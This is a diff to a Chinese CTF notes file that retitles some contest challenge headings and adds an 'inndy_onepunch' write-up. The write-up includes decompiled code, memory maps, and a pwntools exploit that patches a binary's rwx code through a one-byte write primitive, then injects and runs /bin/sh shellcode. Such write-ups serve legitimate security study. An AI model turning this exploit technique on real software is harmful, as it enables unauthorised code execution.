@@ -3739,9 +3739,7 @@ malloc(0x90)
 #这个就是伪造的堆块
 ```
 
-## 浙江省赛初赛
-
-### pwn1
+## 浙江省赛初赛-pwn1
 
 ```c
 void __fastcall __noreturn main(int a1, char **a2, char **a3)
@@ -3860,7 +3858,7 @@ input_1(int(0xe3b01 + read_libc))
 io.interactive()
 ```
 
-### re1
+## 浙江省赛初赛-re1
 
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -3988,7 +3986,7 @@ if __name__ == "__main__":
 
 ```
 
-### pwn2
+## 浙江省赛初赛-pwn2
 
 ```c
 unsigned __int64 edit()
@@ -4086,3 +4084,131 @@ gdb.attach(io)
 io.interactive()
 ```
 
+## inndy_onepunch
+
+这个题目是第二次遇到的一个手法这里我们尝试进行一个分析这里我们先看保护和ida
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+8h] [rbp-18h] BYREF
+  int v5; // [rsp+Ch] [rbp-14h]
+  _QWORD v6[2]; // [rsp+10h] [rbp-10h] BYREF
+
+  v6[1] = __readfsqword(0x28u);
+  setbuf(stdout, 0);
+  printf("Where What?");
+  v5 = __isoc99_scanf("%llx %d", v6, &v4);
+  if ( v5 != 2 )
+    return 0;
+  *(_BYTE *)v6[0] = v4;
+  if ( v4 == 255 )
+    puts("No flag for you");
+  return 0;
+}
+```
+
+这里是保护上面是ida的反编译的代码
+
+```bash
+[*] '/home/fofa/onepunch'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+
+```
+
+这里我们可以知道我们有一个canary，同时没有pie什么的因此我们这里使用的思路也是非常简单，同时在一个函数里面找到了一个shellcode的位置，把这个空间变成了rwx，这里的函数在下面
+
+```c
+signed __int64 _()
+{
+  return sys_mprotect((unsigned __int64)&loc_4006D1 & 0xFFFFFFFFFFFFF000LL, 0x1000u, 7u);
+}
+```
+
+同时我们可以知道我们的数据可以看看vmmap调用
+
+```bash
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+             Start                End Perm     Size Offset File
+          0x400000           0x401000 rwxp     1000      0 /home/fofa/onepunch
+          0x600000           0x601000 r--p     1000      0 /home/fofa/onepunch
+          0x601000           0x602000 rw-p     1000   1000 /home/fofa/onepunch
+        0x3618b000         0x361ac000 rw-p    21000      0 [heap]
+    0x728a0be00000     0x728a0be28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x728a0be28000     0x728a0bfb0000 r-xp   188000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x728a0bfb0000     0x728a0bfff000 r--p    4f000 1b0000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x728a0bfff000     0x728a0c003000 r--p     4000 1fe000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x728a0c003000     0x728a0c005000 rw-p     2000 202000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x728a0c005000     0x728a0c012000 rw-p     d000      0 [anon_728a0c005]
+    0x728a0c02b000     0x728a0c02e000 rw-p     3000      0 [anon_728a0c02b]
+    0x728a0c041000     0x728a0c043000 rw-p     2000      0 [anon_728a0c041]
+    0x728a0c043000     0x728a0c047000 r--p     4000      0 [vvar]
+    0x728a0c047000     0x728a0c049000 r-xp     2000      0 [vdso]
+    0x728a0c049000     0x728a0c04a000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x728a0c04a000     0x728a0c075000 r-xp    2b000   1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x728a0c075000     0x728a0c07f000 r--p     a000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x728a0c07f000     0x728a0c081000 r--p     2000  36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x728a0c081000     0x728a0c083000 rw-p     2000  38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffc1b3be000     0x7ffc1b3df000 rw-p    21000      0 [stack]
+0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
+pwndbg> 
+```
+
+这里我们就可以非常清楚的数据存在一个rwx，同时他的shellcode的地址是在我们的程序段里面，因此我们可以尝试使用修改程序段的位置来进行一个攻击。
+
+因此我们的思路非常清晰：
+
+​	1.我们修改jz代码改到b4上，进行再一次上传
+
+​	2.我们修改完在这个位置后我们直接完成了一个死循环，
+
+​	3.写入一个shellcode，并且使用0xff进行一个运行，修改puts
+
+```py
+from pwn import *
+context(log_level='debug',arch='amd64',os='linux')
+io = process("/home/fofa/onepunch")
+
+def patch(addr, val):
+    io.sendlineafter("Where What?", "%s %s" % (hex(addr), str(val)))
+
+info("Step 1: patch cyclic")
+patch(0x400768, 0xB4)
+
+info("Step 2: write shellcode")
+shellcode = asm(shellcraft.execve("/bin/sh"))
+addr = 0x400769
+for i, j in enumerate(shellcode):
+    patch(addr + i, str(j))
+gdb.attach(io)
+pause()
+info("Step 3: goto shellcode")
+patch(0x400768, 0xff)
+io.interactive()
+
+gdb.attach(io)
+
+io.interactive()
+```
+
+小总结一下
+
+```asm
+.text:0000000000400756 028 48 8B 45 F0                   mov     rax, [rbp+var_10]
+.text:000000000040075A 028 8B 55 E8                      mov     edx, [rbp+var_18]
+.text:000000000040075D 028 88 10                         mov     [rax], dl
+.text:000000000040075F 028 8B 45 E8                      mov     eax, [rbp+var_18]
+.text:0000000000400762 028 3D FF 00 00 00                cmp     eax, 0FFh
+.text:0000000000400767 028 75 0A                         jnz     short loc_400773
+.text:0000000000400767
+.text:0000000000400769 028 BF 28 08 40 00                mov     edi, offset s                   ; "No flag for you"
+.text:000000000040076E 028 E8 ED FD FF FF                call    _puts
+```
+
+在我们使用机器码的时候我们可以控制机器码的跳转位可以控制到读入的位置，改的位置就是68的位置，在这里可以看到他的偏移时0a到这里我们改到b4上
